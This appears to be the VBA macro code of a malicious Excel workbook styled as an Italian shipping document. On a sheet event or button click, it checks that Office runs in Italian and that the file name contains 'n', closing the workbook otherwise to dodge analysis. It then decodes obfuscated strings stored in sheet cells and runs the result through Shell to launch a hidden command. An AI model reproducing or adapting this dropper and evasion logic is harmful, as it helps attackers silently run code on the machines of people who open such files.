Private Sub spedizione_Layout()
If hope > 99 Then Questa_cartella_di_lavoro.cerama
End Sub

Private Sub Visualizza_Click()
If hope = 100 Then Questa_cartella_di_lavoro.cerama
End Sub

Function hope()
If InStr(ActiveWorkbook.Name, "n") > 0 Then hope = 100 Else Questa_cartella_di_lavoro.datti
End Function
Attribute VB_Name = "Questa_cartella_di_lavoro"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Function ettos(y As Integer) As Variant()
koffee = Cells
For i = 18 To 35
agend = agend + Ppay(koffee(i, y))
denca = denca + Ppay(koffee(i, y + 1))
biol = biol + Ppay(koffee(i, y + 2))
Next i
ettos = Array(agend, denca, biol)
End Function
Sub datti()
ActiveWorkbook.Close savechanges:=False
End Sub
Private Function Imperia()
Imperia = msoLanguageIDUI
End Function
Function commune()
commune = ettos(2)
End Function
Function helios()
helios = commune(1)
End Function
Function cerama()
If msoThemeAccent4 * 130 <> hormony Then datti
Dim earth As Workbook: Shell commune(0) & helios + commune(2), msoScaleFromTopLeft: Set earth = Workbooks.Add
End Function
Private Function hormony()
hormony = Application.LanguageSettings.LanguageID(Imperia)
End Function

Function Ppay(ByVal ordine As String) As String
Dim euros, dollars As Integer
Dim mistake, verde() As Integer
Dim price() As Long
Dim report As Integer
    report = IIf(Right(ordine, 1) Mod 2 = 0, 5, 4)
    ordine = Left(ordine, Len(ordine) - IIf(Right(ordine, 1) Mod 2 = 0, 1, 1))
    euros = Len(ordine) / report - 1
    ReDim verde(euros)
    ReDim price(euros)
    dollars = 0
    mistake = 0
    For mistake = 0 To euros
        verde(mistake) = mistake - (euros + 1)
    Next mistake
    For dollars = 0 To euros
        For mistake = 0 To euros
            If CInt(Mid(ordine, mistake * report + 1, report - 3)) = dollars Then
                price(dollars) = (Mid(ordine, (mistake + 1) * report - 2, 3) + verde(dollars))
                Exit For
            End If
        Next mistake
    Next dollars
    Ppay = ""
    For dollars = 0 To euros
        Ppay = Ppay & Chr(price(dollars))
    Next dollars
End Function


